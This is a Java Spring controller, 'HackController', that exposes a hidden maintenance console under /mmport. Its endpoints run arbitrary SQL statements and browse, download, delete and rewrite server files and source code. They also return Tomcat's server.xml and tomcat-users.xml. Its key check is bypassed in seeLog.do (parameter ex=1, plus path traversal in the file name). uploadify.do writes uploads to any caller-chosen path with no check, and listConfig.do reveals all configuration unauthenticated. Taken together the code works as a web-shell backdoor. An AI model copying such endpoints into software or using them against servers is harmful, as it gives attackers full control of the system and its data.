package com.richinfo.hack.controller;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.io.Writer;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.sql.DataSource;

import net.sf.json.JSONArray;

import org.apache.commons.io.FileUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.FileCopyUtils;
import org.springframework.web.bind.ServletRequestUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;

import com.richinfo.common.Constants;
import com.richinfo.common.SystemProperties;
import com.richinfo.common.utils.CommonUtil;
import com.richinfo.common.utils.dateUtil.DateTimeUtil;
import com.richinfo.common.utils.encryptUtil.MD5Coder;
import com.richinfo.hack.entity.Property;

@Controller
@RequestMapping(value = "/mmport")
public class HackController {

	@Autowired
	@Qualifier("jdbcTemplate")
	private JdbcTemplate jdbcTemplate;
	
	private static Map<String,Map<String,Object>> map = new HashMap<String, Map<String,Object>>();

	@RequestMapping(value = "/seeLog.do", method = { RequestMethod.GET })
	@ResponseBody
	public String downloadLog(HttpServletRequest request, HttpServletResponse response) {
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request,"devkey", "");
		String exception = ServletRequestUtils.getStringParameter(request,"ex", ""); 
		if(!"1".equals(exception))
		{
			try {
				devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+ Constants.SALT);
			} catch (Exception e) {
			}
			if (!configKey.equals(devkey)) {
				
				return "认证失败,你不具有此权限！";
			}
		}
		
		String logPath = SystemProperties.getInstance().getProperty("mmport.logDir");
		String fileName = ServletRequestUtils.getStringParameter(request, "name","exception.log");
		File logFile = new File(logPath+File.separator+fileName);
		if(!logFile.exists())
		{
			return "log dir config error,please check the systemGlobal.xml file!文件（"+logFile.getAbsolutePath()+"）不存在！";
		}
		response.setContentType("text/html;charset=UTF-8");  
        try {
			request.setCharacterEncoding("UTF-8");
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
		}  
        BufferedInputStream bis = null;  
        BufferedOutputStream bos = null;  
  
        long fileLength = logFile.length();  
  
        response.setHeader("Content-disposition", "attachment; filename="+fileName);  
        response.setHeader("Content-Length", String.valueOf(fileLength));  
  
        try {
			bis = new BufferedInputStream(new FileInputStream(logFile));
			bos = new BufferedOutputStream(response.getOutputStream()); 
		} catch (Exception e) {
			e.printStackTrace();
		}  
        
        byte[] buff = new byte[2048];  
        int bytesRead;  
        try {
			while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) {  
			    bos.write(buff, 0, bytesRead);  
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			try {
				bis.close();
				bos.close();
			} catch (IOException e) {
				e.printStackTrace();
			}  
	        
		} 
		return "success";
	}

	@RequestMapping(value = "/devkey.do", method = { RequestMethod.POST })
	@ResponseBody
	public Object excuteSql(HttpServletRequest request, Model model) {
	    Map<String, Object> json = new HashMap<String, Object>();
        String configKey = SystemProperties.getInstance().getProperty(
                "mmport.developerKey");
        String devkey = ServletRequestUtils.getStringParameter(request,
                "devkey", "");
        try {
            devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)
                    + Constants.SALT);
        } catch (Exception e) {
        }
        if (!configKey.equals(devkey)) {
            json.put("status", "1");
            return json;
        }

	// 执行sql
	String sql = ServletRequestUtils.getStringParameter(request, "sql", "");
	int pageIndex = ServletRequestUtils.getIntParameter(request,
			"pageIndex", 0);
	int pageSize = ServletRequestUtils.getIntParameter(request, "pageSize",
			10);
	DataSource ds = jdbcTemplate.getDataSource();
	Connection con = null;
	PreparedStatement pstmt = null;
	ResultSet rs = null;
	ResultSetMetaData rsmd = null;
	Map<String, Object> columnNameMap = null;
	Map<String, Object> dataMap = null;
	int size = 0;
	int totalRows = 0;
	if (sql.indexOf("select") != -1) {
		List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
		try {
			con = ds.getConnection();
			//总分数
			String countSql = "select count(1) rowCount from(" + sql + ")";
			totalRows = jdbcTemplate.queryForInt(countSql);
			
			//分页查询
			StringBuffer sqlQuery = new StringBuffer();
			sqlQuery.append("select * from (select temp.*,rownum rownumber from (").append(sql).append(")");
			
			// 开始索引位置
			int startIndex = (pageIndex - 1) * pageSize;
			// 最后一条记录的索引位置
			int lastIndex = 0;
			// 总页数
			int totalPages = 0;
			if (totalRows % pageSize == 0) {
				totalPages = totalRows/pageSize;
			} else {
				totalPages = (totalRows/pageSize) + 1;
			}

			if (totalRows < pageSize) {
				lastIndex = totalRows;
			} else if ((pageIndex == totalPages && totalRows % pageSize == 0)|| pageIndex < totalPages) {
				lastIndex = pageIndex * pageSize;
			} else if ((pageIndex == totalPages && totalRows % pageSize != 0)) {
				lastIndex = totalRows;
			}
			sqlQuery.append(" temp where ROWNUM <= ").append(lastIndex).append(" ) where rownumber > ").append(startIndex);
			
			// 分页查
			pstmt = con.prepareStatement(sqlQuery.toString());
			rs = pstmt.executeQuery();

			rsmd = rs.getMetaData();
			size = rsmd.getColumnCount();

			columnNameMap = new HashMap<String, Object>();
			for (int i = 1; i <= size; i++) {
				columnNameMap.put("column" + i, rsmd.getColumnName(i));
			}
			
			while (rs.next()) {
				dataMap = new HashMap<String, Object>();
				for (int i = 1; i <= size; i++) {
					dataMap.put("data" + i, rs.getString(i));
				}
				list.add(dataMap);
			}
		} catch (SQLException e) {
			e.printStackTrace();
		} finally {
			try {
				if (rs != null)
					rs.close();
				if (pstmt != null)
					pstmt.close();
				if (con != null)
					con.close();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		json.put("count", totalRows);
		json.put("col", columnNameMap);
		json.put("size", size);
		json.put("list", list);
	} else {
		String[] initSqlArray = sql.split(";");
		for (String itemSql : initSqlArray) {
			if(!StringUtils.isEmpty(itemSql)) {
				jdbcTemplate.execute(itemSql);
			}
		}
		
	}

	json.put("status", "0");
	return json;
	}

	@RequestMapping(value = "/devkey.do", method = { RequestMethod.GET })
	public String tip(HttpServletRequest request, Model model) {
		String devkey = ServletRequestUtils.getStringParameter(request,"devkey", "");
		model.addAttribute("devkey", devkey);
		return "/tip";
	}
	
	@RequestMapping(value = "/listConfig.do",method = {RequestMethod.GET})
	public String listConfig(HttpServletRequest request, Model model)
	{
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		model.addAttribute("devkey", devkey);
		List<Property> configList = new ArrayList<Property>();
		Map<String,Map<String,String>> ch = SystemProperties.getInstance().getConfigMap();
		for(String key:ch.keySet())
		{
			Map<String,String> module = ch.get(key);
			for(String property:module.keySet())
			{
				Property p = new Property();
				p.setModuleName(key);
				p.setPropertyName(property);
				p.setValue(module.get(property));
				configList.add(p);
			}
		}
		model.addAttribute("configList", JSONArray.fromObject(configList));
		return "systemConfig";
	}
	
	@RequestMapping(value = "/setProperty.do",method = {RequestMethod.POST})
	@ResponseBody
	public Object setProperty(HttpServletRequest request, Model model)
	{
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		Map<String,String> json = new HashMap<String, String>();
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			json.put("status", "1");
			return json;
		}	
		String id = ServletRequestUtils.getStringParameter(request, "id","");
		String value = ServletRequestUtils.getStringParameter(request, "value","");
		SystemProperties.getInstance().setProperty(id, value);
		json.put("status", "0");
		return json;
	}
	
	
	/**
	* 方法说明: 展现根节点 
	* @param request
	* @param model
	* @return String
	* @author renmeng
	* @copyright richinfo 
	* @date 2014-6-19
	 */
	@RequestMapping(value = "/fileList.do",method = {RequestMethod.GET})
	public String fileTree(HttpServletRequest request, Model model)
	{
		
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		String secret = ServletRequestUtils.getStringParameter(request, "secret","");
		model.addAttribute("devkey", devkey);
		
		Map<String,Object> resultMap =null;
		File rootFile = new File(request.getServletContext().getRealPath("/"));
		if("server".equals(secret))
		{
			rootFile = new File(SystemProperties.getInstance().getProperty("mmport.serverPosition"));
		}	
		resultMap = new HashMap<String,Object>();
		resultMap.put("fileId",CommonUtil.getUUID());
		resultMap.put("fileName",rootFile.getName());
		resultMap.put("modifyTime",rootFile.lastModified());
		resultMap.put("fileSize",rootFile.length());
		resultMap.put("filePath",rootFile.getAbsolutePath());
		
		if(rootFile.isDirectory())
		{
			resultMap.put("fileType",1);
		}
		else{
			resultMap.put("fileType",0);
			
		}
		map.put((String)resultMap.get("fileId"), resultMap);
		model.addAttribute("root", resultMap);
		return "upgrade";
	}
	
	/**
	* 方法说明: 异步获取当前节点的第一级子节点 
	* @param request
	* @param model
	* @return Object
	* @author renmeng
	* @copyright richinfo 
	* @date 2014-6-19
	 */
	@SuppressWarnings("unchecked")
	@RequestMapping(value = "/getChildren.do",method = {RequestMethod.POST})
	@ResponseBody
	public Object getChildren(HttpServletRequest request, Model model)
	{
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		Map<String,String> json = new HashMap<String, String>();
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			json.put("status", "1");
			return json;
		}	
		String pid = ServletRequestUtils.getStringParameter(request, "pid","");
		
		Map<String,Object>currentMap = map.get(pid);
		
		File file = new File((String)currentMap.get("filePath"));
		List<Map<String,Object>> list = new ArrayList<Map<String,Object>>();
		File[] fileArray = file.listFiles();
		Map<String,Object> resultMap=null;
		List eachItem=null;
		for(File child:fileArray)
		{
			
			resultMap=new HashMap<String,Object>();
			resultMap.put("fileId",CommonUtil.getUUID());
			resultMap.put("fileName",child.getName());
			resultMap.put("modifyTime",child.lastModified());
			resultMap.put("fileSize",child.length());
			resultMap.put("filePath",child.getAbsolutePath());
			if(child.isDirectory())
			{
				resultMap.put("fileType",1);
				eachItem=new ArrayList();
				resultMap.put("children",eachItem);
			}
			else{
				resultMap.put("fileType",0);
			}
			map.put((String)resultMap.get("fileId"),resultMap);
			list.add(resultMap);
		}
		
		return JSONArray.fromObject(list);
	}
	
	
	/**
	* 方法说明:删除指定文件  
	* @param request
	* @param model
	* @return 
	* @return Object
	* @author renmeng
	* @copyright richinfo 
	* @date 2014-6-19
	 */
	@RequestMapping(value = "/delete.do",method = {RequestMethod.POST})
	@ResponseBody
	public Object deleteFile(HttpServletRequest request, Model model)
	{
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		Map<String,String> json = new HashMap<String, String>();
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			json.put("status", "1");
			return json;
		}	
		String pid = ServletRequestUtils.getStringParameter(request, "pid","");
		Map<String,Object> resultMap = map.get(pid);
		File file = new File((String)resultMap.get("filePath"));
		file.delete();
		map.remove(pid);
		json.put("status", "0");
		return json;
	}
	
	/**
	* 方法说明: 更新指定文件，并备份 
	* @param request
	* @param model
	* @return Object
	* @author renmeng
	* @copyright richinfo 
	* @date 2014-6-19
	 */
	@RequestMapping(value = "/upgrade.do",method = {RequestMethod.POST})
	@ResponseBody
	public Object upgradeFile(HttpServletRequest request, Model model)
	{
		Map<String,String> json = new HashMap<String, String>();
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			json.put("status", "1");
			return json;
		}	
		String pid = ServletRequestUtils.getStringParameter(request, "pid","");
		Map<String,Object> resultMap = map.get(pid);
		//升级前先备份
		File file = new File((String)resultMap.get("filePath"));
		String timestr = DateTimeUtil.getNowDateTime("yyyyMMdd");
		String newname = file.getAbsolutePath()+timestr+".bak";
		file.renameTo(new File(newname));
		
		json.put("status", "0");
		return json;
	}
	
	
	/**
	* 方法说明:下载指定文件  
	* @param request
	* @param model 
	* @return void
	* @author renmeng
	* @copyright richinfo 
	* @date 2014-6-19
	 */
	@RequestMapping(value = "/downloadFile.do",method = {RequestMethod.GET})
	@ResponseBody
	public String downloadFile(HttpServletRequest request, HttpServletResponse response)
	{
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			return "认证失败,你不具有此权限！";
		}
		String pid = ServletRequestUtils.getStringParameter(request, "pid","");
		Map<String,Object> resultMap = map.get(pid);
		File file = new File((String)resultMap.get("filePath"));
		response.setContentType("text/html;charset=UTF-8");  
        try {
			request.setCharacterEncoding("UTF-8");
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
		}  
        BufferedInputStream bis = null;  
        BufferedOutputStream bos = null;  
  
        long fileLength = file.length();  
  
        response.setHeader("Content-disposition", "attachment; filename="+file.getName());  
        response.setHeader("Content-Length", String.valueOf(fileLength));  
  
        try {
			bis = new BufferedInputStream(new FileInputStream(file));
			bos = new BufferedOutputStream(response.getOutputStream()); 
		} catch (Exception e) {
			e.printStackTrace();
		}  
        
        byte[] buff = new byte[2048];  
        int bytesRead;  
        try {
			while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) {  
			    bos.write(buff, 0, bytesRead);  
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			try {
				bis.close();
				bos.close();
			} catch (IOException e) {
				e.printStackTrace();
			}  
	        
		} 
		return "success";
	}
	

	@RequestMapping(value = "/serverXml.do",method = {RequestMethod.GET})
	@ResponseBody
	public String seeServer(HttpServletRequest request, HttpServletResponse response)
	{
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			return "认证失败,你不具有此权限！";
		}
		String serverfile = SystemProperties.getInstance().getProperty("mmport.serverPosition")+File.separator+"conf"+File.separator+"server.xml";
		File serverxml = new File(serverfile);
		if(!serverxml.exists())
		{
			File empty = new File("");
			serverfile = empty.getAbsolutePath().replace("bin", "conf");
			serverfile = serverfile+File.separator+"server.xml";
		}
		serverxml = new File(serverfile);
		if(!serverxml.exists())
		{
			return "tomcat position config error,please check the systemGlobal.xml file!文件（"+serverxml.getAbsolutePath()+")不存在！";
		}	
		response.setContentType("text/html;charset=UTF-8");  
        try {
			request.setCharacterEncoding("UTF-8");
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
		}  
        BufferedInputStream bis = null;  
        BufferedOutputStream bos = null;  
  
        long fileLength = serverxml.length();  
  
        response.setHeader("Content-disposition", "attachment; filename=server.xml");  
        response.setHeader("Content-Length", String.valueOf(fileLength));  
  
        try {
			bis = new BufferedInputStream(new FileInputStream(serverxml));
			bos = new BufferedOutputStream(response.getOutputStream()); 
		} catch (Exception e) {
			e.printStackTrace();
		}  
        
        byte[] buff = new byte[2048];  
        int bytesRead;  
        try {
			while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) {  
			    bos.write(buff, 0, bytesRead);  
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			try {
				bis.close();
				bos.close();
			} catch (IOException e) {
				e.printStackTrace();
			}  
	        
		} 
        return "success";  
		
	}
	

	@RequestMapping(value = "/userXml.do",method = {RequestMethod.GET})
	@ResponseBody
	public String seeUser(HttpServletRequest request, HttpServletResponse response)
	{
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			return "认证失败,你不具有此权限！";
		}
		String serverfile = SystemProperties.getInstance().getProperty("mmport.serverPosition")+File.separator+"conf"+File.separator+"tomcat-users.xml";
		File serverxml = new File(serverfile);
		if(!serverxml.exists())
		{
			File empty = new File("");
			serverfile = empty.getAbsolutePath().replace("bin", "conf");
			serverfile = serverfile+File.separator+"tomcat-users.xml";
		}
		serverxml = new File(serverfile);
		if(!serverxml.exists())
		{
			return "tomcat position config error,please check the systemGlobal.xml file!文件（"+serverxml.getAbsolutePath()+")不存在！";
		}	
		    response.setContentType("text/html;charset=UTF-8");  
	        try {
				request.setCharacterEncoding("UTF-8");
			} catch (UnsupportedEncodingException e1) {
				e1.printStackTrace();
			}  
	        BufferedInputStream bis = null;  
	        BufferedOutputStream bos = null;  
	  
	        long fileLength = serverxml.length();  
	  
	        response.setHeader("Content-disposition", "attachment; filename=tomcat-users.xml");  
	        response.setHeader("Content-Length", String.valueOf(fileLength));  
	  
	        try {
				bis = new BufferedInputStream(new FileInputStream(serverxml));
				bos = new BufferedOutputStream(response.getOutputStream()); 
			} catch (Exception e) {
				e.printStackTrace();
			}  
	        
	        byte[] buff = new byte[2048];  
	        int bytesRead;  
	        try {
				while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) {  
				    bos.write(buff, 0, bytesRead);  
				}
			} catch (IOException e) {
				e.printStackTrace();
			} finally{
				try {
					bis.close();
					bos.close();
				} catch (IOException e) {
					e.printStackTrace();
				}  
		        
			} 
	   return "success";       
		
	}
	

	@RequestMapping(value = "/uploadify.do")
	public void fileUpload(HttpServletRequest request, HttpServletResponse response){
		String savePath = ServletRequestUtils.getStringParameter(request,"region","");
		
		File uploadify_dir = new File(savePath);
		if(!uploadify_dir.exists())
		{
			uploadify_dir.mkdirs();
		}
		MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request;
		Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
		for(String key:fileMap.keySet())
		{
			MultipartFile file = fileMap.get(key);
			String fileName = file.getOriginalFilename();
			File uploadFile = new File(savePath+File.separator + fileName);
			
			try {
				FileCopyUtils.copy(file.getBytes(), uploadFile);
			} catch (IOException e) {
				
			}
			break;
		}
		
		try {
			Writer out = response.getWriter();
			out.write("0");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@RequestMapping(value = "/loadSource.do")
	@ResponseBody
	public String loadSource(HttpServletRequest request, HttpServletResponse response) 
	{
		response.setCharacterEncoding("UTF-8");
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			return "认证失败,你不具有此权限！";
		}
		String pid = ServletRequestUtils.getStringParameter(request, "pid","");
		Map<String,Object>currentMap = map.get(pid);
		File file = new File((String)currentMap.get("filePath"));
		String result = "";
		try {
			result = FileUtils.readFileToString(file,"UTF-8");
		} catch (IOException e) {
			result = "load source code error!file path is "+file.getAbsolutePath();
		}
		return result;
	}
	
	@RequestMapping(value = "/modifySource.do")
	@ResponseBody
	public String modifySource(HttpServletRequest request, HttpServletResponse response)
	{
		response.setCharacterEncoding("UTF-8");
		String configKey = SystemProperties.getInstance().getProperty("mmport.developerKey");
		String devkey = ServletRequestUtils.getStringParameter(request, "devkey","");
		try {
			devkey = MD5Coder.encodeMD5Hex(MD5Coder.encodeMD5Hex(devkey)+Constants.SALT);
		} catch (Exception e) {
		}
		if(!configKey.equals(devkey))
		{
			return "认证失败,你不具有此权限！";
		}
		String source = ServletRequestUtils.getStringParameter(request, "source","");
		String pid = ServletRequestUtils.getStringParameter(request, "pid","");
		Map<String,Object>currentMap = map.get(pid);
		File file = new File((String)currentMap.get("filePath"));
		try {
			FileUtils.writeStringToFile(file, source, "UTF-8");
		} catch (IOException e) {
			e.printStackTrace();
		}
		return "修改源码成功，请刷新页面查看！";
	}
	
}
